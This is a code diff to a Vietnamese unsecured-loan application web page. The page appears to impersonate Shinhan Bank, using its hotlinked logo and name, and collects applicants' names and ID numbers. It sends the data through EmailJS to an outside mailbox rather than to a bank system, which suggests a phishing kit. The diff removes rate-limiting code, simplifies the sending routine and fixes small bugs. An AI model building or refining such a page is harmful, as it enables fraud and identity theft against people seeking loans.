@@ -124,7 +124,7 @@
             font-weight: 500;
             padding: 8px 16px;
             background-color: #6c757d;
-            color esempio: white;
+            color: white;
             border: none;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
@@ -194,7 +194,7 @@
         .was-validated .form-select:invalid ~ .invalid-feedback {
             display: block;
         }
-        .spam-error, .error-message {
+        .error-message {
             color: #dc3545;
             font-size: 14px;
             font-weight: 500;
@@ -227,7 +227,6 @@
             <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
             <p class="step-description">Vui lòng cung cấp đầy đủ thông tin cá nhân để tiến hành xét duyệt. Thông tin của bạn sẽ được gửi để thẩm định và xử lý hồ sơ.</p>
             <form id="registerForm" novalidate>
-                <div id="spamError" class="spam-error"></div>
                 <div id="emailError" class="error-message"></div>
                 <div id="storageError" class="error-message"></div>
                 <button id="retryEmailBtn" class="btn btn-primary" style="display: none;">Thử lại Email</button>
@@ -360,7 +359,7 @@
                 <div class="mb-3">
                     <div class="terms-box">
                         <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock';">
-                        <p>Thông tin đăng ký sẽ được gửi xét duyệt và thẩm định. Vui lòng kiểm tra lại trước khi gửi hồ sơ. <a href="#" data-bs-toggle="modal" data-bs-target="termsModal">Vui lòng đọc kỹ Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
+                        <p>Thông tin đăng ký sẽ được gửi xét duyệt và thẩm định. Vui lòng kiểm tra lại trước khi gửi hồ sơ. <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Vui lòng đọc kỹ Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                     </div>
                     <div class="form-check">
                         <input class="form-check-input" type="checkbox" id="termsAgree" aria-label="Đồng ý với điều khoản và điều kiện">
@@ -560,7 +559,7 @@
         }
 
         function calculateInterestRate(loanAmount) {
-            if (!loanAmount || !loanAmount <= 0) return 0;
+            if (!loanAmount || loanAmount <= 0) return 0;
             return loanAmount >= 50000000 ? 7.5 : 8.0;
         }
 
@@ -713,13 +712,13 @@
             const idNumber = $('#idNumber').val().trim();
             const registeredIds = loadRegisteredIds();
             $('#registerForm .form-control, #registerForm .form-select').removeClass('is-invalid');
-            $('#spamError, #emailError, #storageError').hide();
+            $('#emailError, #storageError').hide();
             let allFieldsValid = form.checkValidity() && validateInputFormats();
             if (!allFieldsValid) {
                 form.classList.add('was-validated');
             }
             if (idNumber && registeredIds.includes(idNumber)) {
-                $('#spamError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
+                $('#emailError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
                 allFieldsValid = false;
             }
             if (!termsAgree.checked) {
@@ -730,35 +729,6 @@
             }
             confirmBtn.disabled = !allFieldsValid;
             console.log('Form validation:', { allFieldsValid, termsChecked: termsAgree.checked, idNumberRegistered: registeredIds.includes(idNumber) });
-        }
-
-        function checkSpam() {
-            const now = Date.now();
-            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
-            const lastRegistrationTime = spamData.lastRegistrationTime || 0;
-            const registrationCount = spamData.registerCount || 0;
-            const registrationResetTime = spamData.resetTime || now;
-            if (now > registrationResetTime) {
-                spamData.registerCount = 0;
-                spamData.resetTime = now + 24 * 60 * 60 * 1000;
-            }
-            const timeSinceLast = (now - lastRegistrationTime) / 1000;
-            if (timeSinceLast < 300) {
-                return { allowed: false, message: 'Bạn đã đăng ký quá nhanh. Vui lòng thử lại sau 5 phút.' };
-            }
-            if (registrationCount >= 5) {
-                return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
-            }
-            return { allowed: true };
-        }
-
-        function updateSpamData() {
-            const now = Date.now();
-            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
-            spamData.lastRegistrationTime = now;
-            spamData.registerCount = (spamData.registerCount || 0) + 1;
-            spamData.resetTime = spamData.resetTime || now + 24 * 60 * 60 * 1000;
-            localStorage.setItem('spamData', JSON.stringify(spamData));
         }
 
         function sendRegistrationDataEmail() {
@@ -787,29 +757,21 @@
                 return;
             }
             console.log('Preparing to send EmailJS params for Step1:', params);
-            function trySendEmail(attempt = 1, maxAttempts = 5) {
-                emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
-                    .then(() => {
-                        console.log('Email sent successfully on attempt', attempt);
-                        alert("Đã gửi hồ sơ!");
-                        localStorage.removeItem('pendingEmail');
-                        $('#retryEmailBtn').hide();
-                        window.location.href = 'step2.html';
-                    })
-                    .catch(error => {
-                        console.error('EmailJS error on attempt', attempt, ':', error);
-                        if (attempt < maxAttempts) {
-                            console.log('Retrying EmailJS send...');
-                            setTimeout(() => trySendEmail(attempt + 1, maxAttempts), 2000 * Math.pow(2, attempt));
-                        } else {
-                            alert("Thông tin không trùng khớp trên hệ thống. Vui lòng kiểm tra và gửi lại sau.");
-                            localStorage.setItem('pendingEmail', JSON.stringify(params));
-                            $('#emailError').text('Đăng ký quá nhanh vui lòng thử lại sau 10 phút.').show();
-                            $('#retryEmailBtn').show();
-                        }
-                    });
-            }
-            trySendEmail();
+            emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
+                .then(() => {
+                    console.log('Email sent successfully');
+                    alert("Đã gửi hồ sơ!");
+                    localStorage.removeItem('pendingEmail');
+                    $('#retryEmailBtn').hide();
+                    window.location.href = 'step2.html';
+                })
+                .catch(error => {
+                    console.error('EmailJS error:', error);
+                    alert("Lỗi gửi hồ sơ. Vui lòng kiểm tra và gửi lại sau.");
+                    localStorage.setItem('pendingEmail', JSON.stringify(params));
+                    $('#emailError').text('Lỗi hệ thống. Vui lòng thử lại sau.').show();
+                    $('#retryEmailBtn').show();
+                });
         }
 
         window.onload = function() {
@@ -880,14 +842,6 @@
             const form = e.target;
             form.classList.add('was-validated');
             $('#storageError, #emailError').hide();
-            const spamCheck = checkSpam();
-            if (!spamCheck.allowed) {
-                $('#spamError').text(spamCheck.message).show();
-                $('#confirmBtn').prop('disabled', true);
-                return;
-            } else {
-                $('#spamError').hide();
-            }
             if (form.checkValidity() && $('#termsAgree').is(':checked') && validateInputFormats()) {
                 $('#confirmFullName').text($('#fullName').val().trim() || '');
                 $('#confirmIdNumber').text($('#idNumber').val().trim() || '');
@@ -951,7 +905,6 @@
                 saveRegisteredIds(registeredIds);
             }
             if (saveToLocalStorage()) {
-                updateSpamData();
                 sendRegistrationDataEmail();
             } else {
                 console.error('Failed to save to localStorage, not redirecting');
